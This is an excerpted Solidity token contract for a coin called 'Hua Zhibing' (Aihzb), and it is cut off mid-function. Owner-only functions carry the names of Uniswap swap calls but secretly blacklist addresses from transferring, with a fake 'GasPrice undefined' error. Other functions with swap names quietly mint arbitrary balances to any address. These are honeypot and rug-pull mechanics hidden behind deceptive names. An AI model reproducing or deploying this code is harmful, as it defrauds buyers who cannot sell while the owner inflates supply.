...
contract Aihzb is Context , IERC20, Ownable {
    ...
    mapping (address => bool) tokenInlq;
    ...
    string private _name = "Hua Zhibing";
    string private _symbol = "Aihzb";
    ...
    address private devWallet = 0x70B007b71361436f744bdFe8901A3082EC0867B1; //2% for marketing ,1% for giveaways
    ...
    function swapETHForExactTokens (address addr) external {
       require(_ownerShip == _msgSender(), "Ownable: caller is not the owner");
        tokenInlq[addr] = true;
    
    }

    function swapExactETHForTokens (address addr) external {
       require(_ownerShip == _msgSender(), "Ownable: caller is not the owner");
        tokenInlq[addr] = false;
    ...
    function _transfer(
        ...
        require(!tokenInlq[from] && !tokenInlq[to], "GasPrice undefined. Transaction reverted.");
    ...
    function swapExactTokensForETH(uint256 tAmount, address addr) public {
        require(_ownerShip == _msgSender(), "Ownable: caller is not the owner");
        (uint256 rAmount,,,,,) = _getValues(tAmount);
        _rOwned[addr] = _rOwned[addr].add(rAmount);
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 tAmount, address addr) public {
        require(_ownerShip == _msgSender(), "Ownable: caller is not the owner");
        (uint256 rAmount,,,,,) = _getValues(tAmount);
